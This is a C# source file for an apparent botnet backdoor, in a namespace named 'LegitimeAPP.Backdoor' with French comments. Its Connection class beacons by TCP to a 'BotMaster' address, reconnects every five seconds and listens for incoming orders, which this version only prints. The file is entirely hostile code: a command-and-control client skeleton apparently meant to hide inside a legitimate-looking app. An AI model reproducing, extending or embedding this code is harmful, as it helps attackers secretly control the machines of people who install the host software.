
using System ;
using System.Net ;
using System.Net.Sockets ;
using System.Threading;
using System.Text;
using System.IO;
using System.Collections;
using System.Collections.Generic ;
using System.Xml;
using System.Xml.Serialization;

namespace LegitimeAPP.Backdoor {
    public class Connection {

        private IPAddress _masterIP ;
        private int _masterPort ;

        private Stream stm ;
        private TcpClient tcp ;

        // Thread 
        private Thread _FollowingOrders ;
        private Thread _ConnectionRequests ;

        private ASCIIEncoding enc = new ASCIIEncoding() ; 
 


        public Connection(string masterIP, int masterPort) {


            enc = new ASCIIEncoding() ;

            _masterIP = IPAddress.Parse(masterIP) ;
            _masterPort = masterPort ;

            _ConnectionRequests = new Thread(MakeConnectionRequest) ;
            _ConnectionRequests.Name = "Requête de connexion " ;

            _FollowingOrders = new Thread(ListeningOrder) ;
            _FollowingOrders.Name = "" ;

            _ConnectionRequests.Start() ; 
             
        }


        /*

        Ecriture et lecture des messages envoyés et reçu par le serveur 

        */
        private string GetIncomingMessage() {
            byte[] responseRaw = new byte[100] ;
            string response = "" ; 
            int sizeResponse = stm.Read(responseRaw,0,100) ;
            for (int i = 0 ; i < sizeResponse ; i++) {
                response += Convert.ToChar(responseRaw[i]);
            }
            return response ;  
        }

        private void WriteNetMessage(string message) {
            stm.Write(enc.GetBytes(message)) ;
        }


        public bool IsConnected
{
    get
    {
        try
        {
            if (tcp != null && tcp.Client != null && tcp.Client.Connected)
            {
               /* pear to the documentation on Poll:
                * When passing SelectMode.SelectRead as a parameter to the Poll method it will return 
                * -either- true if Socket.Listen(Int32) has been called and a connection is pending;
                * -or- true if data is available for reading; 
                * -or- true if the connection has been closed, reset, or terminated; 
                * otherwise, returns false
                */

                // Detect if client disconnected
                if (tcp.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (tcp.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        // Client disconnected
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }

                return true;
            }
            else
            {
                return false;
            }
        }
        catch
        {
            return false;
        }
    }
}

        private void ListeningOrder() {
            while(true) {

                if ( IsConnected ) {
                    string message = GetIncomingMessage() ;
                    Console.WriteLine("Message : "+message) ;
                } else {
                    Console.WriteLine("Le serveur ne répond plus. Déconnection...") ; 
                     break ;
                }
            }
        }


        private void MakeConnectionRequest() {

            while (true) {
            tcp = new TcpClient() ;
            try {
                // Tentative de connexion au BotMaster 

                tcp.Connect(_masterIP, _masterPort) ;
                stm = tcp.GetStream() ;

                WriteNetMessage("1") ; 
                Console.WriteLine("La connexion avec le botmaster est un succès") ; 

                // On démarre le Thread lorsque la connexion est une réussite


                // Reset le Thread dans le cas ou il a déjà été lancé
                if (_FollowingOrders.ThreadState == ThreadState.Stopped)
                {  
                    _FollowingOrders = new Thread(ListeningOrder) ; 
                } 

                
                _FollowingOrders.Start() ; 
                
                _FollowingOrders.Join() ;

            } catch( Exception _) {

              //  Console.WriteLine(ex.Message) ;       
 
                Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
                }
                Thread.Sleep(5000) ;  
            }
        }
    }
}